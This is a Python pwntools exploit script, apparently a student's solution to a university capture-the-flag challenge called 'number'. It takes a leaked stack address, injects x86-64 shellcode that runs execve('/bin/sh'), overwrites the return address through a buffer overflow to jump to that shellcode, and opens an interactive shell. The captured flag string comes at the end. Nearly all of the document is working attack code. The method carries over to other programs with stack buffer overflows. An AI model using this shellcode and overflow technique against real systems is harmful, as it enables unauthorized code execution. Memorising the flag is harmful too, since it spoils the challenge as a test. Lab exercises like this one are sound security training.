from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./number"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1291
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

print(p.recvuntil(b": ").decode())
number_addr = int(p.recvline().decode().strip(), 16)
log.info(f"Receiving leaked number address: {hex(number_addr)}")

shellcode = asm('''
    xor rdx, rdx                # rdx = NULL (envp pointer)
    mov rax, 0x68732f6e69622f   # Define hex for "/bin/sh" string
    push rax                    # Push "/bin/sh" string onto stack
    mov rdi, rsp                # rdi = address of "/bin/sh" string on stack (pathname pointer)
    push rdi                    # Push string address onto stack for argv[0]
    push rdx                    # Push NULL onto stack for argv[1]
    mov rsi, rsp                # rsi = address of argv array ["/bin/sh", NULL] (argv pointer)
    mov rax, 0x3b               # execve syscall number
    syscall                     # Call execve(rdi, rsi, rdx)
''', arch='amd64')

print(p.recvuntil(b"> ").decode())
p.sendline(shellcode)
log.info(f"Sending shellcode in raw bytes: {shellcode}")

shellcode_addr = number_addr + 8

print(p.recvuntil(b"> ").decode())
msg = b"B" * 0x18 + p64(shellcode_addr)
p.sendline(msg)
log.info(f"Sending message in raw bytes: {msg}")

p.interactive()

# flag{phr4ck_v0lum3_S3v3n_1ssu3_F0rty_N1n3!_682743d0d0edba8d}
